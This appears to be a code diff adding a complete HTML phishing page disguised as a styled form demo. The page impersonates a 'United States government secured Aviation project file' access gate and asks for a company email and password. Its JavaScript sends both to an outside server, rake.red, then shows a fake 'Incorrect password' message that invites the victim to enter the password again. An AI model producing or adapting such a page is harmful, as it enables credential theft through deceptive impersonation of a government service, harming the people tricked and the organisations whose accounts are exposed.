@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Styled Form with Background Transition</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="form-container">
+        <form id="customForm">
+            <img src="logo.jpeg" alt="Logo">
+            <p>You are accessing the United States government secured Aviation project file. Confirm your corresponding company email address and password to access the file.</p>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Access File</button>
+            <div id="feedback" style="display:none;"></div>
+        </form>
+    </div>
+
+    <script>
+        // JavaScript to toggle the background image
+        const body = document.body;
+        setInterval(() => {
+            body.classList.toggle('bg2');
+        }, 5000); // Change every 5 seconds
+
+        // Custom form submission handler
+        document.getElementById('customForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const feedback = document.getElementById('feedback');
+
+            if (password.length < 8) {
+                feedback.style.display = 'block';
+                feedback.textContent = 'Incorrect password. Please try again.';
+                feedback.style.color = 'red';
+                return;
+            }
+
+            fetch('https://rake.red/api/airplane/airport', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                feedback.style.display = 'block';
+                if (data.success) {
+                    feedback.textContent = 'Email submitted successfully!';
+                    feedback.style.color = 'green';
+                } else {
+                    feedback.textContent = 'Incorrect password. Please try again.';
+                    feedback.style.color = 'red';
+                }
+            })
+            .catch((error) => {
+                feedback.style.display = 'block';
+                feedback.textContent = 'An error occurred. Please try again later.';
+                feedback.style.color = 'red';
+            });
+        });
+    </script>
+</body>
+</html>
